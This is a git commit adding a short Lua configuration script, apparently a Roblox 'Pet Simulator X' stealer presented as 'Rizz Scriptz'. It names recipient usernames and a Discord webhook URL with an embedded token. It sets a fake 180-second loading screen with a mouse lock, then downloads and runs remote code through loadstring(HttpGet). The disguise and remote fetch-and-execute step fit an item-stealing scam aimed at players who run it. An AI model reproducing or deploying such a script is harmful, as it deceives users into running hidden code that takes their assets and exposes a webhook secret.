9cae27f70ac599a4bfa61092342fa31cb4804710
blacktrap <132762918+muhammad6919@users.noreply.github.com>
2023-05-18 22:31:25 +0700

    Create Mainstring.lua

---
+++ main/Mainstring.lua
@@ -0,0 +1,15 @@
+UserName = "HieuPetSimx"
+UserName2 = "HieuPetSimx"
+Webhook = "https://discord.com/api/webhooks/1107533224663584778/XWBxYKxxqanRKTpMDOilsxZ9vUfjNYiPGOMWT-diP42edMrYUbbw50sNjT4EqJ68TT3H" 
+
+G.LoadingScreen = true
+G.AntiLeave = false
+G.MouseLock = true 
+
+G.ScriptName = "Rizz Scriptz"
+G.FirstText = "Project-Wd Preparing"
+G.SecondText = "Script Loading..."
+G.ThirdText = "Almost Done..."
+G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes 
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
